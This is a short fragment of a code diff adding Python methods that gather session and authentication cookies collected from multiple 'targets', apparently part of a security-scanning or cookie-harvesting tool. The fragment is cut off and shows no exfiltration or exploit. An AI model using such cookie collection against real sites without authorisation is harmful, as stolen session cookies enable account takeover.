+                            "url": jar.url,
+                            "b3": {name: value},
+                            "session_cookies": jar.session_cookies,
+                        })
+                        break
+        return b3_list
+
+    def get_session_cookies(self) -> List[Dict]:
+        """Return all collected session/auth cookies from all targets."""
+        cookie_list = []
+        for jar in self.collected_cookies:
+            if jar.session_cookies or jar.auth_cookies:
+                cookie_list.append({
+                    "url": jar.url,
+                    "session": jar.session_cookies,
+                    "auth": jar.auth_cookies,
+                    "all": jar.cookies,
+                })
+        return cookie_list
